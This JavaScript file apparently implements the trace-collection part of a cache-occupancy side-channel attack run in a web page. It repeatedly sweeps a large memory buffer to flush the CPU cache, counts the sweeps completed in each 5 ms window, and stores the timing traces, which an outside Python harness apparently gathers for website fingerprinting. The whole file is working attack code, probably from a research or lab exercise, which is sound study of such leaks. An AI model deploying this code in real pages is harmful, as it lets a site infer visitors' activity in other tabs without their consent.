window.recording = false;
window.traces = [];
window.trace_length = 5000; // Python automation updates this

// Attack Parameters
const P = 5;               // Interval in ms
const LINE_SIZE = 8;       // Elements per cache line
const M_LINES = 150000;    // Total cache lines to touch

// The Memory Buffer
let M = null; 
let T = null;

function sweep() {
    // Touch every cache line to flush the cache
    for (let i = 0; i < M_LINES; i++) {
        M[i * LINE_SIZE] += 1;
    }
}

function recordMainThread() {
    const duration = window.trace_length;

    // Allocate memory
    if (M === null) {
        console.log("Allocating memory buffer...");
        M = new Array(M_LINES * LINE_SIZE + 1).fill(0);
        sweep(); // Warmup
    }

    // estimate size to avoid resizing during the attack
    T = new Array(Math.floor(duration / P) + 1000).fill(-1);

    const start = performance.now();
    let idx = 0;

    while (performance.now() - start < duration) {
        const windowStart = performance.now();
        let count = 0;
        
        // Count how many sweeps we can do in P ms
        while (performance.now() - windowStart < P) {
            sweep();
            count++;
        }
        
        if (idx < T.length) {
            T[idx++] = count;
        }
    }

    // Save data directly
    const validTrace = T.slice(0, idx);
    window.traces.push(validTrace);
    window.recording = false;

    // Update UI 
    document.getElementById("status").innerText = 
        "Trace captured! (Length: " + validTrace.length + ")";
    console.log("Trace captured on main thread.");
}

window.collectTrace = function() {
    if (window.recording) return;

    console.log("Starting main thread trace...");
    window.recording = true;
    document.getElementById("status").innerText = "Recording (UI will freeze)...";

    // yield to renderer for 50ms so the text above can actually appear
    setTimeout(() => {
        recordMainThread();
    }, 50);
};